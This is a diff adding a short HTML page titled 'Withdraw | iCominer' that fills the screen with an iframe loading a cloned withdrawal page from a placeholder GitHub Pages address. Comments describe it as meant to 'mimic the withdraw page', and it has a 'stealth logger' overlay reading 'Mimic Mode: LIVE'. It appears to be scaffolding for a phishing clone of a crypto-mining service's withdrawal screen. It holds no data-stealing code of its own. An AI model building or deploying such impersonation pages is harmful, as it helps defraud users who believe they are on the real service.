@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Withdraw | iCominer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: #f7f9fc;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      display: block;
+    }
+    .overlay-log {
+      position: fixed;
+      bottom: 5px;
+      left: 5px;
+      background: rgba(0, 0, 0, 0.7);
+      color: #0f0;
+      font-size: 12px;
+      padding: 4px 8px;
+      z-index: 9999;
+      font-family: monospace;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Fullscreen iFrame to mimic the withdraw page -->
+  <iframe src="https://yourusername.github.io/icominer-clone/withdraw.html" allow="clipboard-write; fullscreen;"></iframe>
+
+  <!-- Optional stealth logger/debug box -->
+  <div class="overlay-log">Mimic Mode: LIVE</div>
+
+</body>
+</html>
